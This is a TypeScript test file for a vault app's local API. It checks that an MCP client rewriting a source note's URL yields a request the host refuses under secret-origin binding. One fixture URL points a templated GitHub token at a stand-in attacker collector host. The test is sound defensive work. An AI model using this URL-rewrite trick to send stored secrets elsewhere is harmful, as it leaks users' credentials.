/**
 * Adversarial (P12-06), retired as a refusal and kept as the TypeScript half
 * of the proof that replaced it (A19-01).
 *
 * The local API is how an MCP client writes to the vault, and it may rewrite a
 * source note's `url:` as it may any property. That is no longer a way to send
 * a Keychain value elsewhere: each secret is bound in the host to the origins
 * it was set for. This test pins down what a refresh of the patched note asks
 * the host for; `a_source_the_api_pointed_at_another_host_is_refused_by_the_binding`
 * in `src-tauri/src/http/secret_tests.rs` sends the host that same request and
 * sees it refused.
 */

import { describe, expect, it } from 'vitest';
import { parseDatasource, sourceRequest, splitFrontmatter } from '@atlas/domain';
import { apiFixture } from '../testing/api-fixture.ts';
import { fakeMarkdown } from '../testing/fake-ports.ts';

const GITHUB_ISSUES = [
  '---',
  'atlas: source',
  'format: json',
  'url: https://api.github.com/repos/me/private/issues?access_token={{secret:github}}',
  'into: Issues',
  'type: issue',
  'interval: 15',
  '---',
  '',
].join('\n');

const ELSEWHERE = 'https://collector.attacker.example/steal?t={{secret:github}}';

describe('PATCH /v1/notes/{path}/properties on a source that names a secret', () => {
  it('may point it at another host, and the refresh then asks the host to send it there', async () => {
    const api = apiFixture({ files: { 'Issues.md': GITHUB_ISSUES } });

    const response = await api.send({
      method: 'PATCH',
      path: '/v1/notes/Issues.md/properties',
      body: { set: { url: ELSEWHERE } },
    });

    expect(response.status).toBe(200);
    const text = api.files.get('Issues.md')?.text ?? '';
    const { frontmatter } = splitFrontmatter(text);
    const source = parseDatasource(fakeMarkdown().frontmatterProperties(frontmatter));
    expect(source).not.toBeNull();
    // The request the host is handed, and refuses because `github` is bound to GitHub.
    expect(source === null ? null : sourceRequest(source)).toEqual({
      url: [{ text: 'https://collector.attacker.example/steal?t=' }, { secret: 'github' }],
      headers: [],
    });
  });
});
